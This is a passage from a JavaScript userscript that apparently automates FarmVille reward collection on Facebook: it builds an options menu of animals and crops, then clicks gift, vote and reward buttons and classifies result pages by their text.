						adopt_reindeer:{type:'checkbox',label:"Reindeer"},
						adopt_clumsyreindeer:{type:'checkbox',label:"Clumsy Reindeer"},
					}},
					
					turklingBlock:{type:'optionblock',label:"Turkeys:",kids:{
						adopt_turkey:{type:'checkbox',label:"Turkey"},
						adopt_whiteturkey:{type:'checkbox',label:"White Turkey"},
						adopt_babybourbonturkey:{type:'checkbox',label:"Baby Bourbon Turkey"},
					}},

					yakBlock:{type:'optionblock',label:"Yaks:",kids:createMenuFromArray(yakTypes,"adopt_yak")},
					
					otheranimalsBlock:{type:'optionblock',label:"Other Animals:",kids:{
						adopt_accountantdog:{type:'checkbox',label:"Accountant Dog"},
						adopt_americanbulldog:{type:'checkbox',label:"American Bulldog"},
						adopt_australiancattledog:{type:'checkbox',label:"Australian Cattle Dog"},
						adopt_backpackturtle:{type:'checkbox',label:"Backpack Turtle"},
						adopt_beaniefoxterrier:{type:'checkbox',label:"Beanie Fox Terrier"},
						adopt_bigbluetangfish:{type:'checkbox',label:"Big Blue Tang Fish"},
						adopt_blackandgreyocelot:{type:'checkbox',label:"Black and Grey Ocelot"},
						adopt_bluedotelephant:{type:'checkbox',label:"Blue Dot Elephant"},
						adopt_bootcutostrich:{type:'checkbox',label:"Bootcut Ostrich"},
						adopt_brachiosaurus:{type:'checkbox',label:"Brachiosaurus"},
						adopt_brownsilverback:{type:'checkbox',label:"Brown Silverback"},
						adopt_browsingmonkey:{type:'checkbox',label:"Browsing Monkey"},
						adopt_bulkorderostrich:{type:'checkbox',label:"Bulk Order Ostrich"},
						adopt_carnotaurus:{type:'checkbox',label:"Carnotaurus"},
						adopt_chinchilla:{type:'checkbox',label:"Chinchilla"},
						adopt_coelophysis:{type:'checkbox',label:"Coelophysis"},
						adopt_collectorseal:{type:'checkbox',label:"Collector Seal"},
						adopt_crownofthornsstarfish:{type:'checkbox',label:"Crown of Thorns Starfish"},
						adopt_domesticshorthair:{type:'checkbox',label:"Domestic Shorthair"},
						adopt_elfpenguin:{type:'checkbox',label:"Elf Penguin"},
						adopt_fedorafoxterrier:{type:'checkbox',label:"Fedora Fox Terrier"},
						adopt_gallimimus:{type:'checkbox',label:"Gallimimus"},
						adopt_halloweentutuhippo:{type:'checkbox',label:"Halloween Tutu Hippo"},
						adopt_harborseal:{type:'checkbox',label:"Harbor Seal"},
						adopt_holidaystbernard:{type:'checkbox',label:"Holiday St. Bernard"},
						adopt_hopperfromdish:{type:'checkbox',label:"Hopper From DISH"},
						adopt_largeparrot:{type:'checkbox',label:"Large Parrot"},
						adopt_lesserflamingo:{type:'checkbox',label:"Lesser Flamingo"},
						adopt_marathontortoise:{type:'checkbox',label:"Marathon Tortoise"},
						adopt_merlecorgi:{type:'checkbox',label:"Merle Corgi"},
						adopt_messengerbagturtle:{type:'checkbox',label:"Messenger Bag Turtle"},
						adopt_mistletoepenguin:{type:'checkbox',label:"Mistletoe Penguin"},
						adopt_navyfuschiaspottedturtle:{type:'checkbox',label:"Navy Fuschia Spotted Turtle"},
						adopt_nightowl:{type:'checkbox',label:"Night Owl"},
						adopt_partybear:{type:'checkbox',label:"Party Bear"},
						adopt_peacoatpenguin:{type:'checkbox',label:"Peacoat Penguin"},
						adopt_penguin:{type:'checkbox',label:"Penguin"},
						adopt_porcupine:{type:'checkbox',label:"Porcupine"},
						adopt_puffyjacketpuffin:{type:'checkbox',label:"Puffy Jacket Puffin"},
						adopt_raccoon:{type:'checkbox',label:"Raccoon"},
						adopt_redgiraffe:{type:'checkbox',label:"Red Giraffe"},
						adopt_ringtail:{type:'checkbox',label:"Ringtail"},
						adopt_riverfloatpug:{type:'checkbox',label:"River Float Pug"},
						adopt_safaribear:{type:'checkbox',label:"Safari Bear"},
						adopt_shoppertiger:{type:'checkbox',label:"Shopper Tiger"},
						adopt_singleorderostrich:{type:'checkbox',label:"Single Order Ostrich"},
						adopt_skinnyjeansostrich:{type:'checkbox',label:"Skinny Jeans Ostrich"},
						adopt_snowleopard:{type:'checkbox',label:"Snow Leopard"},
						adopt_spabear:{type:'checkbox',label:"Spa Bear"},
						adopt_stripedpossum:{type:'checkbox',label:"Striped Possum"},
						adopt_suitmonkey:{type:'checkbox',label:"Suit Monkey"},
						adopt_thinkermonkey:{type:'checkbox',label:"Thinker Monkey"},
						adopt_tikimaskturtle:{type:'checkbox',label:"Tiki Mask Turtle"},
						adopt_treasureseagull:{type:'checkbox',label:"Treasure Seagull"},
						adopt_turtle:{type:'checkbox',label:"Turtle"},
						adopt_babyturtle:{type:'checkbox',label:"Baby Turtle"},
						adopt_uglysweaterbear:{type:'checkbox',label:"Ugly Sweater Bear"},
						adopt_useitseal:{tyhpe:'checkbox',label:"Use It Seal"},
						adopt_walleye:{type:'checkbox',label:"Walleye"},
						adopt_wfhturtle:{type:'checkbox',label:"WFH Turtle"},
						"adopt_white-tailedbuck":{type:'checkbox',label:"White-tailed Buck"},
						adopt_winterfox:{type:'checkbox',label:"Winter Fox"},
						adopt_winterpolarbear:{type:'checkbox',label:"Winter Polar Bear"},
						adopt_zebragiraffe:{type:'checkbox',label:"Zebra Giraffe"},
					}},
				}} 
				}}, //end adoption section

				
				farmcropssep:{type:'separator',label:"Seeds, Bushels & Crafting",kids:{
				seedsep:{type:'tab',label:"Seeds",kids:{
					seedblock1:{type:'optionblock',label:"Pollinated Fruit:",kids:createMenuFromArray(fruitTypes,"polseeds_")},
					seedblock2:{type:'optionblock',label:"Pollinated Vegetables:",kids:createMenuFromArray(vegTypes,"polseeds_")},
					seedblock3:{type:'optionblock',label:"Pollinated Grains:",kids:createMenuFromArray(grainTypes,"polseeds_")},
					seedblock4:{type:'optionblock',label:"Pollinated Flowers:",kids:createMenuFromArray(flowerTypes,"polseeds_")},
					seedblock5:{type:'optionblock',label:"Pollinated Other:",kids:createMenuFromArray(otherBushels,"polseeds_")},
					seedblock6:{type:'optionblock',label:"Pollinated Special:",kids:createMenuFromArray(specialBushels,"polseeds_")},
					seedblock8:{type:'optionblock',label:"Crossbred Seeds:",kids:createMenuFromArray(seedTypes,"seeds_")},

					pollinated:{type:'checkbox',label:"Unknown Seeds"},
				}},

				bushelsep:{type:'tab',label:"Bushels",kids:{
					hlbushelblock:{type:'optionblock',label:"Highlight Bushels By Crafting Cottage",hideSelectAll:true,kids:{
						btnbakery:{type:'button_highlight',label:"Bakery",options:bakeryBushels,clearfirst:allCraftBushels},
						btnwinery:{type:'button_highlight',label:"Winery",options:wineryBushels,clearfirst:allCraftBushels},
						btnspa:{type:'button_highlight',label:"Spa",options:spaBushels,clearfirst:allCraftBushels},
						btnpub:{type:'button_highlight',label:"Pub",options:pubBushels,clearfirst:allCraftBushels},
						btnrestraunt:{type:'button_highlight',label:"Restraunt",options:restrauntBushels,clearfirst:allCraftBushels},
						btncraftshop:{type:'button_highlight',label:"Craftshop",options:craftshopBushels,clearfirst:allCraftBushels},
						btnsweetshoppe:{type:'button_highlight',label:"Sweet Shoppe",options:sweetshoppeBushels,clearfirst:allCraftBushels},
						btntikibar:{type:'button_highlight',label:"Tiki Bar",options:tikibarBushels,clearfirst:allCraftBushels},
						btnteagarden:{type:'button_highlight',label:"Tea Garden",options:teagardenBushels,clearfirst:allCraftBushels},
						btnpotionshop:{type:'button_highlight',label:"Potion Shop",options:potionshopBushels,clearfirst:allCraftBushels},
						btnpatisserie:{type:'button_highlight',label:"Patisserie",options:patisserieBushels,clearfirst:allCraftBushels},
						btnhlnone:{type:'button_highlight',label:"None",clearfirst:allCraftBushels},
					}},

					bushelblock1:{type:'optionblock',label:"Fruit:",kids:createMenuFromArray(fruitTypes,"bushel_")},
					bushelblock2:{type:'optionblock',label:"Vegetables:",kids:createMenuFromArray(vegTypes,"bushel_")},
					bushelblock3:{type:'optionblock',label:"Grains:",kids:createMenuFromArray(grainTypes,"bushel_")},
					bushelblock4:{type:'optionblock',label:"Flowers:",kids:createMenuFromArray(flowerTypes,"bushel_")},
					bushelblock7:{type:'optionblock',label:"Seafood:",kids:createMenuFromArray(seafoodTypes,"bushel_")},
					bushelblock8:{type:'optionblock',label:"Haunted Hollow:",kids:createMenuFromArray(hauntedTypes,"bushel_")},
					bushelblock9:{type:'optionblock',label:"Mistletoe Lane:",kids:createMenuFromArray(mistletoeTypes,"bushel_")},
					bushelblock5:{type:'optionblock',label:"Other:",kids:createMenuFromArray(otherBushels,"bushel_")},
					bushelblock6:{type:'optionblock',label:"Special:",kids:createMenuFromArray(specialBushels,"bushel_")},
					bushel:{type:'checkbox',label:"Unknown Bushels"},
				}},

				preordersep:{type:'tab',label:"Order Crops", kids:{
					preorderblock1:{type:'optionblock',label:"Fruit:",kids:createMenuFromArray(fruitTypes,"order_")},
					preorderblock2:{type:'optionblock',label:"Vegetables:",kids:createMenuFromArray(vegTypes,"order_")},
					preorderblock3:{type:'optionblock',label:"Grains:",kids:createMenuFromArray(grainTypes,"order_")},
					preorderblock4:{type:'optionblock',label:"Flowers:",kids:createMenuFromArray(flowerTypes,"order_")},
					preorderblock7:{type:'optionblock',label:"Seafood:",kids:createMenuFromArray(seafoodTypes,"order_")},
					preorderblock5:{type:'optionblock',label:"Other:",kids:createMenuFromArray(otherBushels,"order_")},
					preorderblock6:{type:'optionblock',label:"Special:",kids:createMenuFromArray(specialBushels,"order_")},

					order:{type:'checkbox',label:"Order Unknown Crops"},
				}},
				
				jointeamsep:{type:'tab',label:"Join Teams",kids:{
					jointeamblock:{type:'optionblock',label:"Join Teams:",kids:createMenuFromArray(craftShop,"join")},
					join:{type:'checkbox',label:"Unknown Crafting Teams"},
				}},
				
				}} //end farms separator

				}} //end farmville section
			} //end menu
		};

		//this converts the menu above to a text string
		//it erases all functions, preventing sidekicks from making destructive changes to the WM script
		//it also provides an early error checking stage before the menu is attached to the WM script
		attString=JSON.stringify(attachment);
	
		//put note on the door
		door.appendChild(createElement('div',{id:'wmDoor_app'+thisApp,'data-ft':attString}));

		//knock on the door
		window.setTimeout(function(){click(door);},1000);

		//cleanup
		doorMark=null;calfTypes=null;foalTypes=null;horseTypes=null;bushelTypes=null;flowerTypes=null;
		treeTypes=null;craftPub=null;craftWinery=null;craftSpa=null;craftBakery=null;craftTypes=null;
		standardMaterials=null;otherConsumables=null;specialMaterials=null;seafoodTypes=null;
		craftingMaterials=null;materials=null;colBerries=null;colCitrus=null;colCows=null;colFlowers=null;
		colGrains=null;colSquash=null;colTypes=null;colGroups=null;questItems=null;duckTypes=null;
		pigTypes=null;sheepTypes=null;cowTypes=null;decorTypes=null;eggTypes=null;otherAnimals=null;
		otherWords=null;buildings=null;attachment=null;attString=null;seedTypes=null;animalCatchalls=null;
		craftRestraunt=null;craftSweetShoppe=null;eggTypes2=null;babyAnimals=null;allCalves=null;
		assTypes=null;allFoals=null;craftPotionShop=null;hauntedTypes=null;craftMistletoeLane=null;
		mistletoeTypes=null;patisserieBushels=null;specialEvents=null;
		
		t1=null;t2=null;t3=null;t4=null;t5=null;t6=null;t7=null;t8=null;t10=null;t11=null;
		t12=null;t13=null;t14=null;t15=null;t16=null;t17=null;t18=null;t19=null;t20=null;t21=null;
		t22=null;t23=null;t27=null;t29=null;t30=null;t31=null;t32=null;t33=null;t34=null;t35=null;
		t36=null;t37=null;t38=null;t39=null;t40=null;t41=null;t42=null;t43=null;
	};

	//a function similar to Facebook Auto Publisher for some FV reward pages autopub does not see
	function sendWishGift(){
		//console.log("sendWishGift");
		//color the panel so we know where the script is right now
		//document.body.style.backgroundColor=["blue","red","white","green","pink","lime","orange"].pickRandom();

		var node = selectSingleNode(".//input[(@name='sendit') and not(contains(@class,'noHammer'))]");
		var vote=Math.floor(Math.random()*2);
		var html = document.documentElement.innerHTML;
		var isSendBushel = html.find("AskForBushels");

		//check for image button gift page
		if (!node) {
			var itemID = location.search.getUrlParam("selectedGift");
			//alert(itemID);
			if (itemID) {
				//check that selectedGift is not a comma delimited list. If it is, separate and choose one
				if (itemID.find(",")) itemID = itemID.split(",").pickRandom();
				else if (itemID.find("%2C")) itemID = itemID.split("%2C").pickRandom();
				//alert(itemID);
			}
			node = $("add_"+itemID);
		}

		//check for radio button gift page
		if (!node) {
			//check for gift page buttons
			var nodes=selectNodes(".//*[contains(@class,'giftLi')]//span[contains(@class,'fb_protected_wrapper')]/input[contains(@class,'request_form_submit')]");
			if (nodes.snapshotLength) {
				//pick one randomly
				node = nodes.snapshotItem( Math.floor(Math.random()*nodes.snapshotLength) );
				node.style.backgroundColor="green";
			}
		}

		//check for single send buttons for pages like send bushel
		if (!node) node=selectSingleNode(".//input[contains(@class,'request_form_submit') and not(contains(@class,'noHammer'))]");
		if (!node) node=selectSingleNode(".//div[contains(@class,'gift_form_buttons')]/a[contains(@class,'giftformsubmit') and not(contains(@class,'noHammer'))]");
		if (!node) node=selectSingleNode(".//div[@class='rfloat']/input[(@name='try_again_button') and not(contains(@class,'noHammer'))]");
		if (!node) node=selectSingleNode(".//input[(@name='acceptReward') and not(contains(@class,'noHammer'))]");
		if (!node) node=selectSingleNode(".//input[(@class='input"+vote+"submit') and not(contains(@class,'noHammer'))]");
		if (!node) node=selectSingleNode(".//div[(@id='vote"+vote+"') and not(contains(@class,'noHammer'))]");

		//if we found a useful button or element to click, click it. 
		//THEN if we expect another button or element to appear on the same window, wait and click that too.
		if (node) {setTimeout(function(){
			if (isSendBushel) {
				var hwnd = window.top;
				hwnd.setTimeout(function(){sendMessage('status=1',hwnd);},2000);
			}
			click(node);
		},500); } else {
			//check for stuff that denotes being done
			node=selectSingleNode(".//input[@class='playButton' and @name='playFarm']");
			if (node) {
				sendMessage('status=1');
			}
		}
		window.setTimeout(sendWishGift,1000); //keep looking
		
	};
	
	//main script function
	function run(){
		//console.log("run");
		var href=window.location.href;
		var text = document.documentElement.textContent;
		var thisLoc; (thisLoc=(location.protocol+"//"+location.host+location.pathname).split("/")).pop(); thisLoc=thisLoc.join("/");
		
		//check for apprequest popup
		if (href.contains('apprequests')) {
			var node = selectSingleNode(".//input[@name='ok_clicked']");
			if (node) click (node);
			return;
		}
		
		//check for preconstructed facebook request items
		else if (href.contains("/plugins/serverfbml.php")) {
			//validate correct app id
			var html = document.documentElement.innerHTML;
			var isSendBushel = html.find("AskForBushels");
			if (html.contains("app_id=102452128776") || html.contains("app_content_102452128776")){
				if (text.find("Sorry, you can't give this user any more gifts") || text.find("Sorry, you can't send this gift")) {sendMessage('status=-1');return;}
				var node = selectSingleNode(".//span[contains(@class,'fb_protected_wrapper')]/input[contains(@class,'request_form_submit')]");
				if (node) {
					//make sure this node is not on the neighbors.php form
					var avoidForm = selectSingleNode(".//ancestor::form[contains(@action,'neighbors.php') or contains(@action,'gifts.php?ref=neighbors')]",{node:node});
					if (!avoidForm) {
						click (node);
						window.setTimeout(sendWishGift,1000); //there is another button named sendit here
					}
				}
			}
			return;
		}

		//check for need to dock to WM Host
		if (href.startsWith('http://www.facebook.com/') && !(href.contains("/plugins/serverfbml.php")) ) {
			dock();
			return;
		}

		//if not on a dockable page, start searching for reward page types

		else if (text.find("Error while loading page from")) {
			sendMessage('status=-5');
			//window.location.reload();
			return;
		}
		
		else if (href.startsWith(thisLoc+'/wishlist_give.php') ){
			//send wish list item
			if (text.find("Sorry, you can't give this user any more gifts") || text.find("Sorry, you can't send this gift")) {sendMessage('status=-1');return;}
			if (selectSingleNode(".//span[contains(@class,'fb_protected_wrapper')]/input[contains(@class,'request_form_submit')]")) window.setTimeout(sendWishGift,1000); //buttons no longer here
			return;
		}

		else if (href.startsWith(thisLoc+'/gifts_send.php')){
			//comes after sending wish gift
			//alert(href);
			window.setTimeout(function(){sendMessage('status=1');},5000);
			return;
		}

		else if (href.startsWith(thisLoc+'/reward_gift_send.php') ){
			//try to send a gift with button
			window.setTimeout(sendWishGift,1000);
			//sendMessage('status=1'); <---dont want to do that here
			return;
		}
		
		else if (href.startsWith(thisLoc+'/index.php') || href.startsWith(thisLoc+'/?' )){
			//alert(href);
			sendMessage('status=1');
			return;
		}

		else if ( href.startsWith(thisLoc+'/gifts.php') && href.contains('giftRecipient=') ){
			//taken to specific gift sending page
			var node; 
			
			//color the panel so we know where the script is right now
			//document.body.style.backgroundColor=["blue","red","white","green","pink","lime","orange"].pickRandom();

			//check for limits
			if (text.find("you can't give this user any more gifts")) {sendMessage('status=-1');}

			//check for normal send buttons
			else if (node=selectSingleNode(".//span[contains(@class,'fb_protected_wrapper')]/input[contains(@class,'request_form_submit')]")) window.setTimeout(sendWishGift,1000);

			//check for radio button gift page
			else if (node=selectSingleNode(".//li[contains(@class,'giftLi')]")) window.setTimeout(sendWishGift,1000);

			//check for image button gift page
			else if (node=selectSingleNode(".//iframe[contains(@src,'farmville.com/gifts.php')]")){
				//break it out of iframes and add the gift names to the url
				var itemID = location.search.getUrlParam('selectedGift'); //copy the gift names
				location.href = node.src+"&selectedGift="+itemID; //redirect and append the gift names
			}

			//default fail
			//else {sendMessage('status=-1');} 
			//dont return from here due to new iframes
			//instead just let the thing open iframes and if it dont work just let it time out

			return;
		}
		
		else if (href.contains('redirecting_zy_session_expired')){
			//alert(href);
			sendMessage('status=1'); 
			return;
		}
		
		else if (href.startsWith(thisLoc+'/gifts.php') ){
			//taken to generic gift sending page with no useful recipient or gift names
			sendMessage('status=-1');
			//OR write in code to select some random gift
			return;
		}

		else if (href.startsWith(thisLoc+'/trading_post_order_place.php') ){
			//taken to place order page
			if (text.find("Congratulations! You've placed a")) sendMessage('status=1');
			else if (text.find("You've reached your limit for ordering from this user")) sendMessage('status=-1');
			else if (text.find("Sorry Farmer! You don't have an order pending with this friend")) sendMessage('status=-1');
			return;
		}

		else if (href.startsWith(thisLoc+'/reward.php') 
			&& (text.find("Would you like a ") || text.find("in your Dino Lab") || text.find("Would you like an ")) 
			&& (text.find("Bushel") || text.find("Basket") || text.find("DNA"))){
			//bushel acceptance stage 1
			//or dino dnd stage 1
			//alert('path set');
			window.setTimeout(sendWishGift,1000);
			return;
		}
		
		/*else if ((href.startsWith(thisLoc+'/performfriendvote.php')||href.startsWith(thisLoc+'//performfriendvote.php')) && (text.match(
				/(naughty or nice|night owl|early( bird)?|plans rigorously|lives spontaneously|lounging|exploring|fashion diva|functional dresser|casually late|stays in|ventures out)/gi
			))){
			window.setTimeout(sendWishGift,1000);
			return;
		}*/

	//	else if ((href.startsWith(thisLoc+'/performfriendvote.php')||href.startsWith(thisLoc+'//performfriendvote.php')) && ($("vote1")||$("vote0"))){
		else if (href.contains('performfriendvote.php') || href.contains('photo_vote')){ //&& ($("vote1")||$("vote0"))
			window.setTimeout(sendWishGift,1000);
			return;
		}
		//else if (href.find('reward.php') ){
		else if (href.startsWith(thisLoc+'/reward.php') || href.contains('reward.php')){
			//document.body.style.backgroundColor=["red","green","blue"].pickRandom();
		
		//*************************************************************************************
		//***** this section must be tailored to fit your specific needs                  *****
		//***** below is a list of searches for text pertaining to various messages       *****
		//***** the list below is not generic and targets Empires and Allies specifically *****
		//***** you will need to find the specific texts for the game you selected        *****
		//*************************************************************************************
		//***** The WM script can recieve and act on the following statusCode values:     *****
		/*
			  1: Acceptance, no stipulations
			  0: Unknown return, use this only if your script encounters unplanned results and can still communicate a result
			 -1: Failure, generic
			 -2: Failure, none left
			 -3: Over Gift Limit failure
			 -4: Over Gift Limit, still allows sending gift, marked as accepted
			 -5: Identified server error
			 -6: Already got, failure marked as accepted
			 -7: Identified server down for repairs
			 -8: Problem finding a required action link
			 -9: reserved for WM functions
			-10: reserved for WM functions
			-11: Identified as expired
			-12: Post source is not a neighbor and neighbor status is required. Future WM version will auto-add neighbor if possible.

			//additional codes may now exist, please check the wiki support site for information
		*/
		//*************************************************************************************
		
			//all out
			if (text.match(
				/(enough (votes|help)|there aren't any more items|been (claimed|picked up)|given out all the free samples they had|are('nt)? (no|any) more|has already received|fresh out of|someone already|isn't yours|got here too late|folks have already|already has enough|already has all the)/gi
			)) sendMessage('status=-2');

			//over limit
			else if (text.match(
				/(you've already got|already have a stallion)/gi
			)) sendMessage('status=-4');
			
			//expired
			else if (text.match(
				/((event|promotion) has (expired|ended)|no longer needs|missed your oppor|expired)/gi
			)) sendMessage('status=-11');

			//requirements not met
			else if (text.match(
				/(You must be level|switch farms and try|need to finish building|don't have a trough|before you can|not open to everyone|you can't send)/gi
			)) sendMessage('status=-13');

			//not a neighbor
			else if (text.match(
				/(only neighbors|only friends can|have to be a neigh|just for your friends)/gi
			)) sendMessage('status=-12');
			
			//gift box full
			else if (text.match(
				/(already got all the (treats|builder)|you need to use|(gift box|storage) is full|at max cap|doesn't need another|is too full|any(place| room) to store)/gi
			)) sendMessage('status=-3');

			//already accepted
			else if (text.match(
				/(voters agree with you|whoa there|slow down there partner|can only help your friend once|already (clicked|claimed|collected|received|hatched|taken part|helping|voted)|you('ve| have)? already (helped|tried|accepted|clicked|voted|gave)|claim one (reward|item)|already on another job)/gi
			)) sendMessage('status=-6');

			//generic fail
			else if (text.match(
				/(is for your friend|not for you|(reward for|can't claim) your own|only your friends|can't claim the animal|out of luck|you can't (help|accept)|try again next time|sorry( (par(t|d)ner|farmer))?)/gi
			)) sendMessage('status=-1');

			//accepted
			else if (what=text.match(
				/(your vote|has been registered|congrat(ulations|s)|yee-haw|hooray|lucky you|you (accepted|helped|claimed|collected)|agreed to join|(you )?just (sent|unlocked|collected|gave you)|(thanks|thank you) for (helping|taking part|your interest|voting)|wants you to have|can find it in your|play farmville|can be found in your gift box)/gi
			)) {sendMessage('status=1'); /*alert(what);*/};
		}

		else if (!defaultTO) defaultTO=window.setTimeout(function(){
			var html=document.documentElement.innerHTML;
			if (html.find("app102452128776_giftsTab")) sendMessage('status=-15');
		},5000);
	};

	//start the script
	window.setTimeout(run,500);

})(); // anonymous function wrapper end